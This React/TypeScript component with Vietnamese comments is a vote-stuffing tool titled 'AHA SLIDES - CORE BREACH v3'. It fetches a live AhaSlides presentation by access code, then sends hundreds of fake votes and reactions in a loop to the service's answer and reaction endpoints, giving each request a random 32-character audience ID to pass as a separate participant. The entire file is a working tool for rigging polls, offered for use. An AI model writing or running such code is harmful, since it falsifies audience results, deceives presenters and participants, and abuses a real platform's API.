import React, { useState, useEffect } from "react";
// Import các kiểu dữ liệu từ file types.ts cục bộ
import { VotePayload, AudienceData, ReactionPayload } from "./types";

/**
 * Tạo ra một chuỗi định danh audience ngẫu nhiên gồm 32 ký tự.
 * Điều này là bắt buộc để mỗi lượt tương tác được xem là duy nhất từ một người dùng khác nhau.
 * @returns Một chuỗi định danh ngẫu nhiên.
 */
function generateRandomAudienceId(): string {
  const chars = "0123456789abcdef";
  let result = "";
  for (let i = 0; i < 32; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

/**
 * Component chính để xử lý logic cho tên miền ahaslides.com.
 * Tự động lấy thông tin slide, cho phép người dùng chọn mục tiêu,
 * và gửi hàng loạt lượt bình chọn hoặc biểu cảm.
 */
const AhaSlides: React.FC<{ url: string }> = ({ url }) => {
  const [audienceData, setAudienceData] = useState<AudienceData | null>(null);
  const [selectedOptionId, setSelectedOptionId] = useState<number | null>(null);
  const [voteCount, setVoteCount] = useState(100);
  const [reactionCount, setReactionCount] = useState(100);
  const [isSendingVotes, setIsSendingVotes] = useState(false);
  const [isSendingReactions, setIsSendingReactions] = useState(false);
  const [statusMessage, setStatusMessage] = useState(
    "Đang khởi tạo kết nối..."
  );

  // Effect này sẽ chạy khi component được render hoặc khi URL thay đổi
  useEffect(() => {
    const fetchAudienceData = async () => {
      try {
        const urlParts = url.split("/");
        const accessCode = urlParts[urlParts.length - 1];

        if (!accessCode) {
          setStatusMessage(
            "Lỗi: Không thể tìm thấy mã truy cập (access code) từ URL."
          );
          return;
        }

        setStatusMessage(
          `Đang lấy dữ liệu slide từ mã truy cập: ${accessCode}...`
        );

        const response = await fetch(
          `https://audience.ahaslides.com/api/presentation/audience-data/${accessCode}`
        );
        if (!response.ok) {
          throw new Error(`Server phản hồi với mã lỗi: ${response.status}`);
        }

        const data: AudienceData = await response.json();
        setAudienceData(data);
        setStatusMessage(
          "Lấy dữ liệu slide thành công! Vui lòng chọn một mục tiêu và bắt đầu."
        );

        // Tự động chọn lựa chọn đầu tiên làm mục tiêu mặc định
        if (data.SlideOptions && data.SlideOptions.length > 0) {
          setSelectedOptionId(data.SlideOptions[0].id);
        }
      } catch (error) {
        console.error("Lỗi khi lấy dữ liệu AudienceData:", error);
        setStatusMessage(
          `Lỗi nghiêm trọng: Không thể lấy dữ liệu slide. Chi tiết: ${
            error instanceof Error ? error.message : String(error)
          }`
        );
      }
    };

    fetchAudienceData();
  }, [url]);

  /**
   * Xử lý việc gửi hàng loạt các yêu cầu bình chọn.
   */
  const handleSendVotes = async () => {
    if (
      !audienceData ||
      selectedOptionId === null ||
      isSendingVotes ||
      isSendingReactions
    ) {
      return;
    }

    setIsSendingVotes(true);
    setStatusMessage(
      `Chuẩn bị gửi ${voteCount} lượt bình chọn cho mục tiêu ID: ${selectedOptionId}...`
    );

    const apiUrl = "https://audience.ahaslides.com/api/answer/create";
    let successfulVotes = 0;

    const templatePayload: Omit<VotePayload, "audience" | "vote"> = {
      presentation: audienceData.presentationId,
      slide: audienceData.id,
      accessCode: audienceData.presentation.accessCode,
      slideTimestamp: audienceData.slideTimestamp,
      type: audienceData.type,
      config: {
        timeToAnswer: audienceData.timeToAnswer,
        multipleChoice: audienceData.multipleChoice,
        isCorrectGetPoint: audienceData.isCorrectGetPoint,
        stopSubmission: audienceData.stopSubmission,
        fastAnswerGetMorePoint: audienceData.fastAnswerGetMorePoint,
        showVotingResultsOnAudience: audienceData.showVotingResultsOnAudience,
        version: audienceData.version,
        quizTimestamp: [],
        otherCorrectQuiz: [],
      },
    };

    for (let i = 0; i < voteCount; i++) {
      const votePayload: VotePayload = {
        ...templatePayload,
        audience: generateRandomAudienceId(),
        vote: [selectedOptionId],
      };

      try {
        const response = await fetch(apiUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(votePayload),
        });
        if (response.ok) successfulVotes++;
        setStatusMessage(
          `Đã gửi ${
            i + 1
          }/${voteCount} lượt vote... Thành công: ${successfulVotes}`
        );
      } catch (error) {
        /* Bỏ qua lỗi mạng để tiếp tục */
      }

      await new Promise((resolve) => setTimeout(resolve, 50));
    }

    setStatusMessage(
      `Hoàn thành! Gửi thành công ${successfulVotes}/${voteCount} phiếu.`
    );
    setIsSendingVotes(false);
  };

  /**
   * Xử lý việc gửi hàng loạt các yêu cầu reaction.
   */
  const handleSendReactions = async (
    reactionType: ReactionPayload["reactionType"]
  ) => {
    if (!audienceData || isSendingVotes || isSendingReactions) {
      return;
    }

    setIsSendingReactions(true);
    setStatusMessage(
      `Chuẩn bị bơm ${reactionCount} reaction '${reactionType}'...`
    );

    const apiUrl = "https://audience.ahaslides.com/api/reaction/";
    let successfulReactions = 0;

    for (let i = 0; i < reactionCount; i++) {
      const reactionPayload: ReactionPayload = {
        audienceId: generateRandomAudienceId(),
        audienceName: "",
        slideId: audienceData.id,
        presentationId: audienceData.presentationId,
        reactionType: reactionType,
      };

      try {
        const response = await fetch(apiUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(reactionPayload),
        });
        if (response.ok) successfulReactions++;
        setStatusMessage(
          `Đã bơm ${
            i + 1
          }/${reactionCount} reaction... Thành công: ${successfulReactions}`
        );
      } catch (error) {
        /* Bỏ qua lỗi mạng để tiếp tục */
      }

      await new Promise((resolve) => setTimeout(resolve, 30));
    }

    setStatusMessage(
      `Hoàn thành! Bơm thành công ${successfulReactions}/${reactionCount} reaction.`
    );
    setIsSendingReactions(false);
  };

  const enabledReactions = audienceData
    ? (
        Object.keys(audienceData.presentation.reactions) as Array<
          keyof typeof audienceData.presentation.reactions
        >
      ).filter((key) => audienceData.presentation.reactions[key])
    : [];
  const isBusy = isSendingVotes || isSendingReactions;

  return (
    <div
      style={{
        backgroundColor: "#000",
        color: "#00FF00",
        fontFamily: 'Consolas, Monaco, "Courier New", Courier, monospace',
        padding: "20px",
        height: "100vh",
        boxSizing: "border-box",
        display: "flex",
        flexDirection: "column",
        border: "2px solid #00FF00",
        borderRadius: "5px",
      }}
    >
      <h2
        style={{ color: "#00FFFF", marginBottom: "15px", textAlign: "center" }}
      >
        :: AHA SLIDES - CORE BREACH v3 ::
      </h2>

      {audienceData ? (
        <>
          <fieldset
            disabled={isBusy}
            style={{
              borderColor: "#00FF00",
              marginBottom: "20px",
              padding: "15px",
            }}
          >
            <legend
              style={{
                color: "#00FFFF",
                padding: "0 10px",
                fontWeight: "bold",
              }}
            >
              &#x23; MODULE VOTE
            </legend>
            <h4 style={{ color: "#00FF00", margin: "0 0 10px 0" }}>
              CHỌN MỤC TIÊU VOTE:
            </h4>
            <div
              style={{
                maxHeight: "150px",
                overflowY: "auto",
                border: "1px solid #008800",
                padding: "10px",
                marginBottom: "15px",
                backgroundColor: "#111",
              }}
            >
              {audienceData.SlideOptions.map((option) => (
                <div key={option.id} style={{ marginBottom: "8px" }}>
                  <input
                    type="radio"
                    id={`option-${option.id}`}
                    name="voteOption"
                    value={option.id}
                    checked={selectedOptionId === option.id}
                    onChange={() => setSelectedOptionId(option.id)}
                    style={{ accentColor: "#00FF00" }}
                  />
                  <label
                    htmlFor={`option-${option.id}`}
                    style={{
                      color: "#0F0",
                      marginLeft: "10px",
                      cursor: "pointer",
                    }}
                  >
                    {option.title} (Hiện có: {option.votesCount} votes)
                  </label>
                </div>
              ))}
            </div>
            <div style={{ display: "flex", alignItems: "center", gap: "20px" }}>
              <div>
                <label
                  htmlFor="vote-count"
                  style={{ color: "#0F0", marginRight: "10px" }}
                >
                  <strong style={{ color: "#00FF00" }}>SỐ LƯỢNG:</strong>
                </label>
                <input
                  id="vote-count"
                  type="number"
                  value={voteCount}
                  onChange={(e) =>
                    setVoteCount(parseInt(e.target.value, 10) || 1)
                  }
                  min="1"
                  style={{
                    width: "80px",
                    padding: "5px",
                    backgroundColor: "#222",
                    color: "#00FF00",
                    border: "1px solid #00FF00",
                    borderRadius: "3px",
                    fontFamily: "inherit",
                    fontSize: "1em",
                  }}
                />
              </div>
              <button
                onClick={handleSendVotes}
                disabled={!selectedOptionId}
                style={{
                  padding: "8px 15px",
                  backgroundColor: !selectedOptionId ? "#222" : "#00FF00",
                  color: "#000",
                  border: "none",
                  borderRadius: "3px",
                  cursor: !selectedOptionId ? "not-allowed" : "pointer",
                  fontFamily: "inherit",
                  fontSize: "0.9em",
                }}
              >
                {isSendingVotes ? ">> INJECTING..." : ">> INJECT VOTES"}
              </button>
            </div>
          </fieldset>

          <fieldset
            disabled={isBusy}
            style={{ borderColor: "#00FF00", padding: "15px" }}
          >
            <legend
              style={{
                color: "#00FFFF",
                padding: "0 10px",
                fontWeight: "bold",
              }}
            >
              &#x23; MODULE REACTION
            </legend>
            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: "20px",
                marginBottom: "15px",
              }}
            >
              <div>
                <label
                  htmlFor="reaction-count"
                  style={{ color: "#0F0", marginRight: "10px" }}
                >
                  <strong style={{ color: "#00FF00" }}>SỐ LƯỢNG:</strong>
                </label>
                <input
                  id="reaction-count"
                  type="number"
                  value={reactionCount}
                  onChange={(e) =>
                    setReactionCount(parseInt(e.target.value, 10) || 1)
                  }
                  min="1"
                  style={{
                    width: "80px",
                    padding: "5px",
                    backgroundColor: "#222",
                    color: "#00FF00",
                    border: "1px solid #00FF00",
                    borderRadius: "3px",
                    fontFamily: "inherit",
                    fontSize: "1em",
                  }}
                />
              </div>
              <div style={{ display: "flex", gap: "10px", flexWrap: "wrap" }}>
                {enabledReactions.map((reaction) => (
                  <button
                    key={reaction}
                    onClick={() =>
                      handleSendReactions(
                        reaction as ReactionPayload["reactionType"]
                      )
                    }
                    style={{
                      padding: "8px 15px",
                      backgroundColor: "#00FF00",
                      color: "#000",
                      border: "none",
                      borderRadius: "3px",
                      cursor: "pointer",
                      fontFamily: "inherit",
                      fontSize: "0.9em",
                    }}
                  >
                    Bơm "{reaction}"
                  </button>
                ))}
              </div>
            </div>
          </fieldset>
        </>
      ) : (
        <p
          style={{
            fontStyle: "italic",
            flexGrow: 1,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
          }}
        >
          &#x23; CONNECTING TO AHA-SERVER...
        </p>
      )}

      {statusMessage && (
        <div
          style={{
            marginTop: "20px",
            padding: "10px",
            border: "1px dashed #00FF00",
            borderRadius: "4px",
            backgroundColor: "#111",
            color: "#00FF00",
            fontSize: "0.85em",
            whiteSpace: "pre-wrap",
            flexGrow: 1,
            overflowY: "auto",
          }}
        >
          <strong style={{ color: "#00FFFF" }}>&#x23; STATUS LOG:</strong>
          <p style={{ margin: "5px 0 0", color: "#98FB98" }}>{statusMessage}</p>
        </div>
      )}
    </div>
  );
};

export default AhaSlides;
